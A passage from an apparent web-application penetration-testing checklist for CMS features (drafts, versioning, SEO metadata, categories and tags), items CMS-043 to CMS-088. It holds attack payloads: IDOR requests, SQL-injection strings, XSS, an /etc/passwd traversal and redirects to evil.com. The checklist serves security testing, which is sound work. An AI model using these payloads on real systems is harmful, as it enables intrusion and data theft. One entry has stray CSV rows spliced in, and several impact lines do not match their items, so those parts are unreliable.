**Test Steps:** 1. Create draft as User A 2. Access draft URL as User B 3. View unauthorized draft

**Expected Result:** Drafts should be author-only

**Payload Example:**

```
GET /api/content/drafts/victim_draft_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## CMS-044 — Publish Without Approval
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Draft / Publish / Schedule

**Test Steps:** 1. Log in as contributor 2. Submit content for review 3. Directly call publish endpoint

**Expected Result:** Publishing should require approval workflow

**Payload Example:**

```
POST /api/content/123/publish bypassing review
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## CMS-045 — Unpublish IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Draft / Publish / Schedule

**Test Steps:** 1. Unpublish own content 2. Modify content_id 3. Unpublish others' content

**Expected Result:** Unpublish should verify permissions

**Payload Example:**

```
POST /api/content/victim_content/unpublish
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## CMS-046 — Schedule Time Manipulation
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Draft / Publish / Schedule

**Test Steps:** 1. Schedule content for future 2. Modify scheduled time to past 3. Bypass scheduling

**Expected Result:** Scheduled times should be validated server-side

**Payload Example:**

```
{"scheduled_at":"2020-01-01T00:00:00Z"} backdating
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## CMS-047 — Schedule Access Before Publish
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Draft / Publish / Schedule

**Test Steps:** 1. Find scheduled content ID 2. Access directly 3. View before scheduled time

**Expected Result:** Scheduled content should be time-locked

**Payload Example:**

```
GET /api/content/scheduled_id before publish time
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## CMS-048 — Schedule Race Condition
**Test Category:** Race Condition · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Draft / Publish / Schedule

**Test Steps:** 1. Rapidly change schedule status 2. Exploit timing window 3. Create inconsistent state

**Expected Result:** Schedule changes should be atomic

**Payload Example:**

```
Parallel publish/unpublish requests
```

**Impact:** Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend).

**Tools:** Turbo Intruder / Burp Suite

**References:** CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle Smashing the State Machine

---

## CMS-049 — Draft Status Manipulation
**Test Category:** Business Logic · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Draft / Publish / Schedule

**Test Steps:** 1. Create draft 2. Directly modify status field 3. Bypass workflow

**Expected Result:** Status changes should follow workflow

**Payload Example:**

```
{"status":"published"} without approval
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## CMS-050 — Scheduled Content Enumeration
**Test Category:** Information Disclosure · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Draft / Publish / Schedule

**Test Steps:** 1. Iterate through content IDs 2. Find scheduled content 3. Discover upcoming content

**Expected Result:** Scheduled content existence should be hidden

**Payload Example:**

```
Response differences for scheduled vs nonexistent
```

**Impact:** Username/account enumeration -&gt; a valid-target list that fuels credential stuffing / phishing / ATO.

**Tools:** Burp Suite Intruder / ffuf

**References:** CWE-204; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-IDNT-04

---

## CMS-051 — Draft Version Confusion
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Draft / Publish / Schedule

**Test Steps:** 1. Edit draft while publishing 2. Race between draft and publish 3. Publish wrong version

**Expected Result:** Version handling should be atomic

**Payload Example:**

```
Concurrent draft edit and publish
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Turbo Intruder / Manual Testing

**References:** CWE-840; PortSwigger Business logic

---

## CMS-052 — CSRF on Publish Action
**Test Category:** Cross-Site Request Forgery · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Draft / Publish / Schedule

**Test Steps:** 1. Create malicious page 2. Trigger publish action 3. Content published without consent

**Expected Result:** Publish should require CSRF token

**Payload Example:**

```
<form action="/admin/content/123/publish" method="POST">
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite CSRF PoC / Custom HTML

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## CMS-053 — Schedule Notification Bypass
**Test Category:** Business Logic · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Draft / Publish / Schedule

**Test Steps:** 1. Schedule content 2. Modify notification settings 3. Bypass notification requirements

**Expected Result:** Notifications should be enforced if required

**Payload Example:**

```
{"skip_notifications":true}
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## CMS-054 — Bulk Publish IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Draft / Publish / Schedule

**Test Steps:** 1. Bulk publish own content 2. Include others' content IDs 3. Publish unauthorized content

**Expected Result:** Bulk actions should verify all items

**Payload Example:**

```
POST /api/content/bulk-publish {"ids":["own",victim1,victim2]}
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## CMS-055 — Version Access IDOR
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Content Versioning

**Test Steps:** 1. View own content versions 2. Modify content_id 3. Access others' version history

**Expected Result:** Version access should verify ownership

**Payload Example:**

```
GET /api/content/victim_content/versions
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## CMS-056 — Version Restore IDOR
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Content Versioning

**Test Steps:** 1. Restore own content version 2. Modify content_id 3. Restore/overwrite others' content

**Expected Result:** Restore should verify permissions

**Payload Example:**

```
POST /api/content/victim_content/versions/5/restore
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## CMS-057 — Version Delete IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Content Versioning

**Test Steps:** 1. Delete own version 2. Modify version_id 3. Delete others' versions

**Expected Result:** Deletion should verify ownership

**Payload Example:**

```
DELETE /api/content/123/versions/victim_version
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## CMS-058 — Version Compare XSS
**Test Category:** Cross-Site Scripting · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Content Versioning

**Test Steps:** 1. Create version with XSS 2. Compare versions 3. XSS in diff view

**Expected Result:** Diff views should sanitize content

**Payload Example:**

```
XSS payload in version content
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## CMS-059 — Version History Information Leak
**Test Category:** Information Disclosure · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Content Versioning

**Test Steps:** 1. View version history 2. Check for exposed author info 3. Extract user details

**Expected Result:** Version history should respect privacy

**Payload Example:**

```
Exposed author emails or internal IDs
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Browser DevTools

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## CMS-060 — Unlimited Version Creation
**Test Category:** Denial of Service · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Content Versioning

**Test Steps:** 1. Edit content repeatedly 2. Create thousands of versions 3. Exhaust storage

**Expected Result:** Version count should be limited

**Payload Example:**

```
Create 10000 versions via automated edits
```

**Impact:** Denial of service -&gt; availability impact for this feature / the app.

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-400; -&gt;[Race Condition checklist](#/checklist/racecondition); OWASP; PortSwigger

---

## CMS-061 — Version Timestamp Manipulation
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Content Versioning

**Test Steps:** 1. Create version 2. Modify timestamp 3. Alter audit trail

**Expected Result:** Timestamps should be server-generated

**Payload Example:**

```
{"version_created":"2020-01-01T00:00:00Z"}
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## CMS-062 — Rollback Privilege Escalation
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Content Versioning

**Test Steps:** 1. Rollback to version with elevated content 2. Restore privileged data 3. Bypass current restrictions

**Expected Result:** Rollback should validate current permissions

**Payload Example:**

```
Restore version containing admin-only content
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## CMS-063 — Version Diff SQL Injection
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Content Versioning

**Test Steps:** 1. Compare versions with SQL in parameters 2. Inject payload 3. Extract database data

**Expected Result:** Version queries should be parameterized

**Payload Example:**

```
/versions/compare?v1=1&v2=2' OR '1'='1
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap / Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## CMS-064 — Auto-save Version Injection
**Test Category:** Cross-Site Scripting · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Content Versioning

**Test Steps:** 1. Find auto-save functionality 2. Inject XSS in auto-saved content 3. XSS executes on load

**Expected Result:** Auto-saved content should be sanitized

**Payload Example:**

```
Auto-save with <script>alert(1)</script>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## CMS-065 — Version Export Data Leak
**Test Category:** Information Disclosure · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Content Versioning

**Test Steps:** 1. Export version history 2. Check for sensitive metadata 3. Extract internal information

**Expected Result:** Exports should filter sensitive data

**Payload Example:**

```
Export containing internal notes or deleted content
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Postman

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## CMS-066 — Concurrent Version Conflict
**Test Category:** Race Condition · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Content Versioning

**Test Steps:** 1. Edit same content from two sessions 2. Save simultaneously 3. Check for data loss

**Expected Result:** Concurrent edits should be handled

**Payload Example:**

```
Parallel PUT requests losing changes
```

**Impact:** Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend).

**Tools:** Turbo Intruder / Multiple Browsers

**References:** CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle Smashing the State Machine

---

## CMS-067 — Stored XSS in Meta Title
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** SEO Metadata

**Test Steps:** 1. Edit SEO title 2. Insert XSS payload 3. View page source or preview

**Expected Result:** Meta content should be encoded

**Payload Example:**

```
><script>alert('XSS')</script><meta name=x
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## CMS-068 — Stored XSS in Meta Description
**Test Category:** Cross-Site Scripting · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** SEO Metadata

**Test Steps:** 1. Edit meta description 2. Insert XSS payload 3. View rendered page

**Expected Result:** Description should be sanitized

**Payload Example:**

```
><script>alert(document.cookie)</script>,High,Burp Suite|XSS Hunter
SEO Metadata,Open Graph Injection,Cross-Site Scripting,1. Modify OG tags 2. Inject malicious content 3. XSS when shared on social,OG content should be sanitized,og:title with <script>alert(1)</script>,Medium,Burp Suite|Social Sharing Test
SEO Metadata,Canonical URL Manipulation,Open Redirect,1. Edit canonical URL 2. Point to external site 3. SEO hijacking,Canonical URLs should be validated,<link rel=canonical" href="https://evil.com/">
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / Postman

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## CMS-069 — Robots Meta Injection
**Test Category:** Security Misconfiguration · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** SEO Metadata

**Test Steps:** 1. Access robots meta field 2. Modify indexing directives 3. Expose hidden content

**Expected Result:** Robots directives should be controlled

**Payload Example:**

```
noindex changed to index for private content
```

**Impact:** Security misconfiguration -&gt; weakened control exploitable via the mapped attack.

**Tools:** Burp Suite / Postman

**References:** CWE-16; OWASP Security Misconfiguration (A05)

---

## CMS-070 — Structured Data Injection
**Test Category:** Cross-Site Scripting · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** SEO Metadata

**Test Steps:** 1. Modify JSON-LD structured data 2. Inject malicious JSON 3. Break page or inject script

**Expected Result:** Structured data should be validated

**Payload Example:**

```
{"@type":"malicious",script:"<script>alert(1)</script>"}
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / Browser DevTools

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## CMS-071 — SEO Metadata IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** SEO Metadata

**Test Steps:** 1. Edit own SEO metadata 2. Modify content_id 3. Edit others' SEO settings

**Expected Result:** SEO access should verify ownership

**Payload Example:**

```
PUT /api/content/victim_id/seo
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## CMS-072 — Hreflang Tag Manipulation
**Test Category:** Business Logic · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** SEO Metadata

**Test Steps:** 1. Edit hreflang tags 2. Redirect language versions 3. SEO manipulation

**Expected Result:** Hreflang should be validated

**Payload Example:**

```
<link hreflang="en" href="https://competitor.com/">
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## CMS-073 — Twitter Card Injection
**Test Category:** Cross-Site Scripting · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** SEO Metadata

**Test Steps:** 1. Modify Twitter card data 2. Inject malicious content 3. XSS on preview

**Expected Result:** Twitter card data should be sanitized

**Payload Example:**

```
twitter:title with script payload
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / Twitter Card Validator

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## CMS-074 — Schema.org Injection
**Test Category:** Injection · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** SEO Metadata

**Test Steps:** 1. Add custom schema markup 2. Inject malicious schema 3. Manipulate rich snippets

**Expected Result:** Schema markup should be validated

**Payload Example:**

```
Malicious schema for phishing display
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite / Schema Validator

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## CMS-075 — Meta Redirect Injection
**Test Category:** Open Redirect · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** SEO Metadata

**Test Steps:** 1. Access meta refresh field 2. Inject redirect 3. Redirect users

**Expected Result:** Meta refresh should be restricted

**Payload Example:**

```
<meta http-equiv="refresh" content="0;url=evil.com">
```

**Impact:** Open redirect -&gt; OAuth code/token theft, credible phishing on the trusted origin.

**Tools:** Burp Suite / Browser DevTools

**References:** CWE-601; -&gt;[Open Redirect checklist](#/checklist/openredir); PortSwigger; PayloadsAllTheThings

---

## CMS-076 — Alt Text XSS
**Test Category:** Cross-Site Scripting · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** SEO Metadata

**Test Steps:** 1. Edit image alt text in SEO 2. Inject XSS 3. Execute on hover/screen reader

**Expected Result:** Alt text should be sanitized

**Payload Example:**

```
alt="<script>alert(1)</script>"
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## CMS-077 — Stored XSS in Category Name
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Categories / Tags

**Test Steps:** 1. Create category with XSS 2. View category list 3. XSS executes

**Expected Result:** Category names should be sanitized

**Payload Example:**

```
<script>alert('XSS')</script>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## CMS-078 — Stored XSS in Tag Name
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Categories / Tags

**Test Steps:** 1. Create tag with XSS payload 2. View content with tag 3. Execute script

**Expected Result:** Tags should be sanitized

**Payload Example:**

```
<img src=x onerror=alert(1)>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## CMS-079 — SQL Injection in Category Filter
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Categories / Tags

**Test Steps:** 1. Filter content by category 2. Inject SQL in category parameter 3. Extract data

**Expected Result:** Category queries should be parameterized

**Payload Example:**

```
/content?category=1' OR '1'='1'--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap / Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## CMS-080 — SQL Injection in Tag Search
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Categories / Tags

**Test Steps:** 1. Search tags 2. Inject SQL payload 3. Extract database information

**Expected Result:** Tag searches should use parameterized queries

**Payload Example:**

```
/tags?search='; SELECT * FROM users--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap / Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## CMS-081 — Category IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Categories / Tags

**Test Steps:** 1. Edit own category 2. Modify category_id 3. Edit others' categories

**Expected Result:** Category editing should verify ownership

**Payload Example:**

```
PUT /api/categories/victim_category_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## CMS-082 — Category Delete IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Categories / Tags

**Test Steps:** 1. Delete own category 2. Modify category_id 3. Delete others' categories

**Expected Result:** Deletion should verify permissions

**Payload Example:**

```
DELETE /api/categories/victim_category_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## CMS-083 — Hidden Category Access
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Categories / Tags

**Test Steps:** 1. Find hidden category slug 2. Access directly 3. View restricted content

**Expected Result:** Hidden categories should require auth

**Payload Example:**

```
GET /category/internal-announcements
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## CMS-084 — Tag Hijacking
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Categories / Tags

**Test Steps:** 1. Create tag similar to existing 2. Use Unicode variations 3. Hijack traffic

**Expected Result:** Tags should be normalized

**Payload Example:**

```
#tаg (Cyrillic а) vs #tag
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Hackvertor

**References:** CWE-840; PortSwigger Business logic

---

## CMS-085 — Category Nesting Depth Attack
**Test Category:** Denial of Service · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Categories / Tags

**Test Steps:** 1. Create deeply nested categories 2. Cause rendering issues 3. Performance degradation

**Expected Result:** Category depth should be limited

**Payload Example:**

```
Create 100 levels of nested categories
```

**Impact:** Denial of service -&gt; availability impact for this feature / the app.

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-400; -&gt;[Race Condition checklist](#/checklist/racecondition); OWASP; PortSwigger

---

## CMS-086 — Mass Tag Assignment
**Test Category:** Business Logic · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Categories / Tags

**Test Steps:** 1. Assign many tags to content 2. Exceed tag limits 3. Abuse tagging system

**Expected Result:** Tag count should be limited

**Payload Example:**

```
Assign 1000 tags to single content
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-840; PortSwigger Business logic

---

## CMS-087 — Reserved Category Usage
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Categories / Tags

**Test Steps:** 1. Find reserved category names 2. Create category with reserved name 3. Bypass restrictions

**Expected Result:** Reserved names should be blocked

**Payload Example:**

```
Create category named "admin" or "system"
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## CMS-088 — Category Slug Injection
**Test Category:** Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Categories / Tags

**Test Steps:** 1. Create category with special characters 2. Inject in URL slug 3. Path traversal or injection

**Expected Result:** Slugs should be sanitized

**Payload Example:**

```
../../../etc/passwd or slug with SQL
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite / Postman

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

